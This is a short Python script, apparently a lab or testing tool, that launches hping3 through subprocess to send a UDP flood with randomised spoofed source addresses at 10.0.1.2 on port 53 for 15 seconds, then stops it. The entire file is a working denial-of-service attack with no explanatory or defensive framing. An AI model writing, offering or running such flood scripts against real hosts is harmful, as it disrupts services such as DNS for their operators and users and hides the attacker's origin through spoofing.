import subprocess
import time

TARGET = "10.0.1.2"
PORT = 53
DURATION = 15

def main():
    print(f"[+] Starting UDP flood against {TARGET}:{PORT}")
    
    process = subprocess.Popen([
        "sudo", "hping3",
        "--udp",
        "--flood",
        "-p", str(PORT),
        TARGET,
        "--rand-source"
    ])

    try:
        time.sleep(DURATION)
    except KeyboardInterrupt:
        print("\n[-] Interrupted by user.")

    process.terminate()
    print("[+] UDP flood stopped.")

if __name__ == "__main__":
    main()